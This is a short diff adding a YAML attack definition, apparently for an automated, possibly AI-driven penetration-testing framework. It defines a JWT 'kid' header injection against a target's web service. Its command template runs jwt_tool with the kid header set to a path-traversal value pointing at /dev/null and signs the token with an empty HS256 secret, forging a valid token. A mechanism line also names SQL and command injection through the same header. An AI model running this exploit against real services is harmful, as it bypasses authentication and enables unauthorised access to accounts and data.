@@ -1,0 +1,16 @@
+name: jwt_kid_injection
+category: web
+description: JWT kid header injection
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "python3 jwt_tool.py '{token}' -I -hc kid -hv '../../../../../../dev/null' -S hs256 -p ''"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "JWT kid (key ID) header may be vulnerable to: path traversal (use /dev/null as key → empty secret), SQL injection (extract secret from DB), command injection."
